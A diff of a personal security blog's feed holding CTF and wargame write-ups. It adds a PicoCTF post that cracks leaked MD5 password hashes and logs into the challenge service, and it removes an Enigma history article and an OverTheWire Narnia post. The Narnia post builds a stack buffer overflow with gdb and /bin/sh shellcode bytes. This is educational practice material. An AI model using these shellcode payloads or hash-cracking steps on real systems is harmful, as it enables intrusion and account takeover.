+&lt;span class=&quot;s&quot;&gt;'Theres_more_than_one_way_to_RSA'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Thanks &lt;a href=&quot;http://stackoverflow.com/questions/9641440/convert-from-ascii-string-encoded-in-hex-to-plain-ascii&quot;&gt;Andrew&lt;/a&gt; for this snippet. Here's the flag! &lt;/p&gt;
+
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="PicoCTF 2017" /><summary type="html">WeirdRSA - 90 PTS</summary></entry><entry><title type="html">PicoCTF - Leaked Hashes</title><link href="http://localhost:4000/picoctf-leaked-hashes/" rel="alternate" type="text/html" title="PicoCTF - Leaked Hashes" /><published>2017-04-14T00:00:00+00:00</published><updated>2017-04-14T00:00:00+00:00</updated><id>http://localhost:4000/picoctf-leaked-hashes</id><content type="html" xml:base="http://localhost:4000/picoctf-leaked-hashes/">&lt;h1&gt;Leaked Hashes - 90 PTS&lt;/h1&gt;
+
+&lt;p&gt;Someone got hacked! Check out some service's password hashes that were leaked at hashdump.txt! Do you think they chose strong passwords? We should check... The service is running at shell2017.picoctf.com:61096!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root:be3f7de032d2e398ec542a7df71e0417
+christene:cc5847ba595f097885b2bbe5eb940e22
+nadia:f3ab9dc32a394eb1cdf922659abcdead
+myra:4dff179a4ec49e978ce72e6bf39b7d86
+sharell:05635c2378051c67022b9096e0813aeb
+lilli:05635c2378051c67022b9096e0813aeb
+ilene:b51bc648f9d5e58971705b5efdc098a5
+emiko:ee4d5bc25a2771d95fdbd24452e355ad
+lindsey:c9f01a6d41d78f79585a30fdc815bf17
+deandrea:c9dd062917d9feb763b10fbcb483abfa
+honey:74fe6370a9626ef1887c0e3ca4e6b600
+diana:9ff497405dbd1cf3c17576629cf35475
+lucretia:ac2f556a0eb415745b31e14a91d55d75
+.
+.
+.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we will have to try and crack at least one of these passwords provided in the dump, so we can log into the service. My favourite &lt;a href=&quot;https://hashkiller.co.uk/md5-decrypter.aspx&quot;&gt;Hashkiller&lt;/a&gt; website used to cracking MD5 hashes did it without any problem. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;be3f7de032d2e398ec542a7df71e0417 [Not found]
+cc5847ba595f097885b2bbe5eb940e22 [Not found]
+f3ab9dc32a394eb1cdf922659abcdead MD5 : 0u70u73r
+4dff179a4ec49e978ce72e6bf39b7d86 MD5 : s3r0w
+05635c2378051c67022b9096e0813aeb MD5 : r3v3l
+b51bc648f9d5e58971705b5efdc098a5 MD5 : p0lyp
+ee4d5bc25a2771d95fdbd24452e355ad MD5 : r3s4w
+c9f01a6d41d78f79585a30fdc815bf17 MD5 : sp337
+c9dd062917d9feb763b10fbcb483abfa [Not found]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can log in using &lt;i&gt;nadia:0u70u73r&lt;/i&gt; credentials. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@W3ndige ~&amp;gt; nc shell2017.picoctf.com 61096
+enter username:
+nadia
+nadia&lt;span class=&quot;s1&quot;&gt;'s password:0u70u73r
+welcome to shady file server. would you like to access the cat ascii art database? y/n
+y
+
+     /\__/\
+    /`    '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; 0  0 &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;
+    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; --  /    - flag is 1ae2d736242e28658d08e8b47dbf49bf
+
+   /        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  /          &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+ |            |
+  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  /
+   &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;oo__oo_/#######o
+
+              &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;-/&lt;span class=&quot;s2&quot;&gt;&quot;).___..--''&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-._
+               &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;6_ 6  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-.  (     ).&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-.__.&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)
+               (_Y_.)'  ._   )  &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;._ &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;. &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;``&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-..-'
+             _..&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;--&lt;span class=&quot;s1&quot;&gt;'_..-_/  /--'&lt;/span&gt;_.&lt;span class=&quot;s1&quot;&gt;' ,'&lt;/span&gt;
+           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;il&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,-&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;li&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'  ((!.-'&lt;/span&gt;
+
+from http://user.xmission.com/~emailbox/ascii_cats.htm&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Here we have the flag! &lt;/p&gt;
+
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="PicoCTF 2017" /><summary type="html">Leaked Hashes - 90 PTS</summary></entry><entry><title type="html">Overthewire.org - Behemoth 1 -&amp;gt; 2</title><link href="http://localhost:4000/overthewire.org-behemoth-2/" rel="alternate" type="text/html" title="Overthewire.org - Behemoth 1 -&gt; 2" /><published>2017-04-02T00:00:00+00:00</published><updated>2017-04-02T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-behemoth-2</id><content type="html" xml:base="http://localhost:4000/overthewire.org-behemoth-2/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Today we're going to attack another reverse engineering challenge from &lt;b&gt;Behemoth&lt;/b&gt; series, to improve our knowledge in reverse engineering.  &lt;/p&gt;
 
 &lt;h1&gt;Challenge&lt;/h1&gt;
 
@@ -86,11 +238,11 @@ behemoth2
 cat /etc/behemoth_pass/behemoth2
 &lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;As you may know, first try didn't work becaouse the shellcode opened the shell without any argumants, resulting in immediate close. Adding &lt;b&gt;cat - &lt;/b&gt; allowed us to keep the shell open, and view the password. &lt;/p&gt;
+&lt;p&gt;As you may know, the first try didn't work because the shellcode opened the shell without any arguments, resulting in immediate close. Adding &lt;b&gt;cat - &lt;/b&gt; allowed us to keep the shell open, and view the password. &lt;/p&gt;
 
 &lt;h1&gt;Conclusion&lt;/h1&gt;
 &lt;p&gt;Fun as always, and very educational. Thanks &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;!&lt;/p&gt;
-&lt;p&gt;I would also like to point out that if you're thinking about starting journey with CTF challenges &lt;a href=&quot;https://picoctf.com/&quot;&gt;&lt;b&gt;PicoCTF&lt;/b&gt;&lt;/a&gt; is now running, with a lot of great challenges. Check that out if you're interested!&lt;/p&gt;
+&lt;p&gt;I would also like to point out that if you're thinking about starting journey with CTF challenges &lt;a href=&quot;https://picoctf.com/&quot;&gt;&lt;b&gt;PicoCTF&lt;/b&gt;&lt;/a&gt; is running now, with a lot of great challenges. Check that out if you're interested!&lt;/p&gt;
 
 &lt;p&gt;~ Stay safe! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Vulnhub.com - Pluck</title><link href="http://localhost:4000/vulnhub-pluck/" rel="alternate" type="text/html" title="Vulnhub.com - Pluck" /><published>2017-03-26T02:00:00+00:00</published><updated>2017-03-26T02:00:00+00:00</updated><id>http://localhost:4000/vulnhub-pluck</id><content type="html" xml:base="http://localhost:4000/vulnhub-pluck/">&lt;h1&gt;Introduction&lt;/h1&gt;
 
@@ -2499,228 +2651,4 @@ base64 -d /var/local/.luke|less.real&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 &lt;p&gt;64Base was an awesome challenge, with lots of tricks, some hard, some easy, but all really entertaining and interesting. Big thanks to &lt;a href=&quot;https://3mrgnc3.ninja/2016/12/64base/&quot;&gt;&lt;b&gt;3mrgnc3&lt;/b&gt;&lt;/a&gt; for creating this challenge, and &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;&lt;b&gt;VulnHub&lt;/b&gt;&lt;/a&gt; for hosting it! &lt;/p&gt;
 &lt;p&gt;I also hope, that you've enjoyed this write-up, I'll definitely do more of these in the future, so stay updated. And as always... &lt;/p&gt;
 
-&lt;p&gt;~ Stay safe! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Vulnhub" /><summary type="html">Introduction</summary></entry><entry><title type="html">Enigma</title><link href="http://localhost:4000/enigma/" rel="alternate" type="text/html" title="Enigma" /><published>2017-02-07T00:00:00+00:00</published><updated>2017-02-07T00:00:00+00:00</updated><id>http://localhost:4000/enigma</id><content type="html" xml:base="http://localhost:4000/enigma/">&lt;h1&gt;Brief history behind Enigma&lt;/h1&gt;
-
-&lt;p&gt;The first Enigma machine was discovered by &lt;b&gt;Arthur Scherbius&lt;/b&gt;, German engineer who acquired the patent in 1918. Name of this device originated from Greek word - riddle.  It was used commercially from the early 1920s, and was also adopted by the military and governmental services of a number of nations — most famously German Army. Communication during those days was sent over radio which means that everyone could easily listen. But at that moment no one could spy on Nazi messages - Scherbius' Enigma provided them with the strongest cryptographic cipher of the world. &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/enigma/scherbius.jpg&quot; alt=&quot;Scherbius&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Arthur Scherbius&lt;/small&gt;&lt;/p&gt;
-
-&lt;p&gt;Since 1926 English cryptanalysts were eavesdropping German radio messages, unfortunately without being able to extract their meaning. But Polish officials, afraid of German attack started working on analyzing and breaking the cipher in office called Cipher Bureau (Biuro Szyfrów). By 1933 &lt;b&gt;Marian Rejewski&lt;/b&gt;, &lt;b&gt;Henryk Zygalski&lt;/b&gt; and &lt;b&gt;Jerzy Różycki&lt;/b&gt; broke Enigma, by exploiting a fatal flaw of how Enigma operators sent their messages, and were able to determine the daily keys of almost every message that was intercepted. &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/enigma/polish-crypto-breakers.jpg&quot; alt=&quot;Polish-cryptanalysts&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;From left: Jerzy Różycki, Henryk Zygalski and Marian Rejewski&lt;/small&gt;&lt;/p&gt;
-
-&lt;p&gt; They even developed a machine called the Bombe (Bomba), that made the process of codebreaking much faster. But back then keys were changing only once every few months, while during the war keys were changing at least once a day. In July 1939, just before the start of war Poles decided to inform the British and French about their research, also asking for help.   &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/enigma/enigma-machine.jpg&quot; alt=&quot;Enigma-photo&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Enigma&lt;/small&gt;&lt;/p&gt;
-
-&lt;p&gt;At Bletchley Park &lt;b&gt;Alan Turing&lt;/b&gt;, together with fellow code-breaker &lt;b&gt;Gordon Welchman&lt;/b&gt; invented different version of Bombe. When an Enigma message was intercepted, codebreakers had to search for so-called cribs, which were presumed pieces of plain text within the encrypted message. That way Turing Bombe would search for the enigma settings for a given piece of plain and cipher text. Although the British bombe actually owes little to the Bomba, Poles contributed a lot by supplying the internal wiring of the Enigma's rotors. They also demonstrated that Enigma can be broked using another machine. It has been estimated that the efforts of Turing and his fellow code-breakers shortened the war by several years. What is certain is that they saved countless lives and helped to determine the course and outcome of the conflict.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/enigma/bombe.jpeg&quot; alt=&quot;British-bombe&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;British Bombe&lt;/small&gt;&lt;/p&gt;
-
-&lt;p&gt;But let's head back from the history to something more technical. &lt;/p&gt;
-
-&lt;h1&gt;Cryptography&lt;/h1&gt;
-
-&lt;p&gt;Firstly, let's find out how Enigma has worked. &lt;/p&gt;
-
-&lt;p&gt;When sender sends the message, Enigma creates an electrical signal that goes through the wiring of the machine. First step for this signal is plugboard which attempts to get around frequency analysis. Some of the letters on the plugboard would be wired to other letters (plugs). Signal going through one of these plugs change original input into different letter, but also leaving some of the original letters unmoved. &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/enigma/plugboard.jpg&quot; alt=&quot;Enigma-plugboard&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;View on the plugboard&lt;/small&gt;&lt;/p&gt;
-
-&lt;p&gt;The next step is the static rotor, which simply turns wires into static contacts, making the signal pass only when the contacts touch. But after that, things are getting a little bit more complicated. There are 5 rotors, with the possibility to choose 3 of them, for three positions - left, middle and right. Each rotor has their own set of inner, and outer rings of contacts. The outer ring contacts connect to the next rotor, together with its own inner ring. Purpose of these rings is to even more scramble the signal, resulting in more letter substitutions.  &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/enigma/rotors.png&quot; alt=&quot;Enigma-rotors&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Rotor electrical view&lt;/small&gt;&lt;/p&gt;
-
-&lt;p&gt;In addition, as each letter is entered, the rotors rotate by one position, so that the same letters are never connected together in the same message. And even more, each rotor has notches in different positions which, when reached, cause the next rotor to its left to step forward too.&lt;/p&gt;
-
-&lt;p&gt;Last step that electrical signal takes before going back to the light board is the reflector. In Enigma machine there are 2 possible reflectors, each wired differently and producing different letter when reflected back. Journey back through the rotors works exactly the same way in reverse. Signal remains the same when passing through the static rotor, then going through the plugboard on the same principles. After that, signal goes to lightboard, where the light, corresponding for each letter, lits up.   &lt;/p&gt;
-
-&lt;p&gt;&lt;b&gt;But how would you decrypt the message? &lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;To decode your message, you would need to know what rotor and plugboard settings were used during encryption. This was possible with use of monthly sheets, containing basic settings for every day of the month. They were in the custody of an officer, responsible for setting up the machine rotors and ringsettings. After setup, he could lock the machine front panel with a key. The operator of Enigma could only select the rotor start position.  &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/enigma/key-sheets.jpg&quot; alt=&quot;Key-sheets&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Example of Wehrmacht Enigma key sheet&lt;/small&gt;&lt;/p&gt;
-
-&lt;h1&gt;Mathematical Security of Enigma&lt;/h1&gt;
-
-&lt;p&gt;Now, how secure is Enigma? Let's count all of the possibilities. &lt;/p&gt;
-
-&lt;p&gt;Enigma has 5 rotors, from which 3 are used. &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/enigma/equation_1.png&quot; alt=&quot;First-equation&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Then all 3 rotors have 26 positions, one for each letter of the alphabet. &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/enigma/equation_2.png&quot; alt=&quot;Second-equation&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Quite a large number, right? Yet, we have to calculate all possibilities with the plug board. &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/enigma/equation_3.png&quot; alt=&quot;Third-equation&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;And lastly, multiply them all together. This gives us quite a lot of combinations.  &lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/enigma/possibilities.png&quot; alt=&quot;Possibilities&quot; class=&quot;img-responsive&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;h1&gt;Last Words&lt;/h1&gt;
-
-&lt;p&gt;Enigma, was without doubt machine with great encryption capabilities. This war could have last much longer, or even end completely different, without hard work of great cryptanalytic minds working together on this operation. &lt;/p&gt;
-
-&lt;p&gt;~ Stay safe!&lt;/p&gt;
-
-&lt;h1&gt;References&lt;/h1&gt;
-&lt;p&gt;[1] &lt;a href=&quot;https://en.wikipedia.org/wiki/Enigma_machine&quot;&gt;&lt;b&gt;Wikipedia&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;[2] Singh Simon (2000) &lt;b&gt;The Code Book: The Science of Secrecy from Ancient Egypt to Quantum Cryptography&lt;/b&gt;&lt;/p&gt;
-&lt;p&gt;[3] Rejewski Marian (1981) &lt;b&gt;How the Polish Mathematicians Broke the Enigma. Annals of the History of Computing.&lt;/b&gt;&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Cryptography" /><summary type="html">Brief history behind Enigma</summary></entry><entry><title type="html">Overthewire.org - Narnia 2 -&amp;gt; 3</title><link href="http://localhost:4000/overthewire.org-narnia-3/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 2 -&gt; 3" /><published>2017-02-03T00:00:00+00:00</published><updated>2017-02-03T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-narnia-3</id><content type="html" xml:base="http://localhost:4000/overthewire.org-narnia-3/">&lt;h1&gt;Introduction&lt;/h1&gt;
-
-&lt;p&gt;What about another challenge in reverse engineering? Anywhere, anytime! &lt;/p&gt;
-
-&lt;h1&gt;Challenge&lt;/h1&gt;
-
-&lt;p&gt;As always, let's start from viewing the source code.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: %s argument&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Okay, now let's run it. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ ./narnia2
-Usage: ./narnia2 argument
-narnia2@melinda:/narnia$ ./narnia2 ARGUMENT
-ARGUMENTnarnia2@melinda:/narnia$&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As in the source code, we see that if argument is not passed, then usage instructions are printed, otherwise value of argument is printed on the next line. In addition, source code gives us information that char buf is 128 bytes in size. Let's try to trigger the segmentation fault. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;ARGUMENTnarnia2@melinda:/narnia$ ./narnia2 $(python -c &quot;print 'A' * 140&quot;)
-Illegal instruction
-narnia2@melinda:/narnia$ ./narnia2 $(python -c &quot;print 'A' * 141&quot;)
-Segmentation fault&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Hmm, that's interesting. After trying different amounts of A letters, I've noticed that by writing 140 of them, we will get &lt;b&gt;Illegal instruction&lt;/b&gt; message, but 141 letters end up with our desired &lt;b&gt;Segmentation fault&lt;/b&gt;. Maybe gdb will tell us something more? &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ gdb ./narnia2
-(gdb) break *main
-Breakpoint 1 at 0x804845d&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Firstly let's investigate the illegal instruction option. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 140&quot;)
-Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 140&quot;)
-
-Breakpoint 1, 0x0804845d in main ()
-(gdb) c
-Continuing.
-
-Program received signal SIGILL, Illegal instruction.
-0xf7e3ca00 in __libc_start_main () from /lib32/libc.so.6
-(gdb) c
-Continuing.
-
-Program terminated with signal SIGILL, Illegal instruction.
-The program no longer exists.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Unfortunately after doing some research I've found out that SIGILL won't help us much. What we have to try is to overwrite the &lt;b&gt;instruction pointer. &lt;/b&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 144&quot;)
-Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 144&quot;)
-
-Breakpoint 1, 0x0804845d in main ()
-(gdb) c
-Continuing.
-
-Program received signal SIGSEGV, Segmentation fault.
-0x41414141 in ?? ()
-(gdb) c
-Continuing.
-
-Program terminated with signal SIGSEGV, Segmentation fault.
-The program no longer exists.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Luckily, adding only 3 more A's overwrote the pointer. But here comes another problem, what is its address? &lt;/p&gt;
-&lt;p&gt;We can try to find out by writing around B's at the end. Let's see. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 138 + 'B' * 6&quot;)
-Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 138 + 'B' * 6&quot;)
-
-Breakpoint 1, 0x0804845d in main ()
-(gdb) c
-Continuing.
-
-Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
-(gdb) x/200x $esp
-0xffffd7f0:	0x00000000	0x00000000	0xb7000000	0x9449f175
-0xffffd800:	0xb7857a44	0x6da4653e	0x69a15cf3	0x00363836
-0xffffd810:	0x00000000	0x6d61672f	0x6e2f7365	0x696e7261
-0xffffd820:	0x616e2f61	0x61696e72	0x41410032	0x41414141
-0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd8b0:	0x41414141	0x42424242	0x58004242	0x535f4744&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great! EIP address is 0xffffd8b3. Now we have to find a way to use shellcode from previous challenge. But firstly, let's find its length. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ python -c'print(len(&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;))'
-25&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;25 bytes. As our string have to be 144 bytes in length, I'll firstly write 112 bytes of A letters, then 25 bytes of our shellcode and then overwrite the EIP with memory address somewhere in the middle of A's. Let's try it out! &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'B' * 4&quot;)
-Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'B' * 4&quot;)
-
-(gdb) x/200x $esp
-0xffffd7f0:	0x00000000	0x00000000	0x4d000000	0x2bdc9c96
-0xffffd800:	0xd596f713	0x775b1954	0x6969a442	0x00363836
